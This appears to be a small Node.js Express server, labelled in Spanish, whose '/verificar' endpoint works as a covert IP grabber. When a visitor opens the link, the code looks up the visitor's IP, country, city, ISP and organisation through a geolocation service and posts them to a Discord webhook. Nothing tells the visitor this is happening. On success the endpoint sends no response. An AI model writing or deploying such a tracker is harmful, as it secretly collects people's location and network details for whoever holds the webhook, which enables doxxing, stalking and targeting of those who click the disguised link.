const express = require('express');
const axios = require('axios');
const app = express();


const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

app.get('/verificar', async (req, res) => {
    try {
        
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,org,query`);
        const info = geoRes.data;

       
        await axios.post(DISCORD_WEBHOOK_URL, {
            embeds: [{
                title: "🔔 Nueva Visita Detectada",
                color: 3447003, 
                fields: [
                    { name: "IP", value: info.query || ip, inline: true },
                    { name: "País/Ciudad", value: `${info.country}, ${info.city}`, inline: true },
                    { name: "Proveedor (ISP)", value: info.isp || "Desconocido" },
                    { name: "Organización", value: info.org || "N/A" }
                ],
                timestamp: new Date()
            }]
        });

       

    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).send("Error en el servidor");
    }
});


app.listen(3000, () => {
    console.log('Backend corriendo en http://localhost:3000/verificar');
});
